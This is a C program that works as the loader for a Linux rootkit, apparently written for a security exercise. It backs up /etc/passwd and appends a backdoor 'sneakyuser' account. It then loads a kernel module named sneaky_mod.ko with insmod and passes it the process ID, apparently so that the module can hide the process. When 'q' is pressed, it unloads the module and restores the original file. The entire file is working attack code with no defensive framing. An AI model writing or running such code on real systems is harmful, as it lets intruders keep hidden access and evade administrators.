#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void copy_and_modify(const char *f_src, const char *f_dst, int modify) {
    FILE *src;
    FILE *dst;
    char ch;
    if ((src = fopen(f_src, "r")) == NULL) {
        perror("Source file open failed.\n");
        exit(EXIT_FAILURE);
    }
    if ((dst = fopen(f_dst, "w")) == NULL) {
        perror("Destination file open failed.\n");
        exit(EXIT_FAILURE);
    }
    while ((ch = fgetc(src)) != EOF) {
        fputc(ch, dst);
    }

    fclose(src);
    fclose(dst);

    if (modify) {
        FILE *m;
        if ((m = fopen("/etc/passwd", "a")) == NULL) {
            perror("Modified file open failed.\n");
            exit(EXIT_FAILURE);
        }

        const char *add_line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
        fputs(add_line, m);
        fclose(m);
    }
}

void load_module(const char *module) {
    pid_t cpid, w;
    int wstatus;
    cpid = fork();
    if (cpid == -1) {
        perror("Load module fork failed.\n");
        exit(EXIT_FAILURE);
    }

    if (cpid == 0) {
        char arg0[100];
        //pid_t ppid=getppid();
        sprintf(arg0, "sneaky_process_id=%d", (int)getppid());
        int res = execlp("insmod", "insmod", module, arg0,  (char *)0);
        if (res == -1) {
            perror("insmod execution failed.\n");
            exit(EXIT_FAILURE);
        }
    } else {
        w = waitpid(cpid, &wstatus, 0);
        if (w == -1) {
            perror("Load module waitpid failed.\n");
            exit(EXIT_FAILURE);
        }
    }
}

void unload_module(const char *module) {
    pid_t cpid, w;
    int wstatus;
    cpid = fork();
    if (cpid == -1) {
        perror("Unload module fork failed.\n");
        exit(EXIT_FAILURE);
    }

    if (cpid == 0) {
        int res = execlp("rmmod", "rmmod", module, (char *)0);
        if (res == -1) {
            perror("rmmod execution failed.\n");
            exit(EXIT_FAILURE);
        }
    } else {
        w = waitpid(cpid, &wstatus, 0);
        if (w == -1) {
            perror("Unload module waitpid failed.\n");
            exit(EXIT_FAILURE);
        }
    }
}

int main() {
    printf("sneaky_process pid = %d\n", getpid());

    copy_and_modify("/etc/passwd", "/tmp/passwd", 1);

    load_module("sneaky_mod.ko");

    while (getc(stdin) != 'q') {}

    unload_module("sneaky_mod.ko");

    copy_and_modify("/tmp/passwd", "/etc/passwd", 0);

    return EXIT_SUCCESS;
}